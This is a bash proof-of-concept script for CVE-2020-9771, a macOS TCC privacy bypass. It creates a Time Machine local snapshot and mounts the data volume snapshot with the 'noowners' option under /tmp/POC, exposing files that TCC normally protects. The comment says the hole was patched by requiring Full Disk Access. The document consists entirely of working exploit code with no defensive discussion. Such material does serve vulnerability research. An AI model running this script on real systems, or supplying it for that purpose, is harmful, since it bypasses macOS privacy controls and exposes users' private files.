#!/bin/bash
# PoC: CVE-2020-9771 TCC Bypass – It was patched by TCC Full Disk Access (FDA).
# Still, Terminal with FDA can read the contents of the whole system.
# https://theevilbit.github.io/posts/cve_2020_9771/

# Create a new local snapshot
tmutil localsnapshot

# Automatically retrieve the latest snapshot ID
SNAPSHOT_ID=$(tmutil listlocalsnapshots / | grep 'com.apple.TimeMachine' | tail -n 1 | awk '{print $NF}')

# Define the mount point (create if it doesn't exist)
MOUNT_DIR="/tmp/POC"
mkdir -p "$MOUNT_DIR"

# Mount the latest snapshot with noowners option
/sbin/mount_apfs -o noowners -s "$SNAPSHOT_ID" /System/Volumes/Data "$MOUNT_DIR"

echo "Snapshot mounted at $MOUNT_DIR"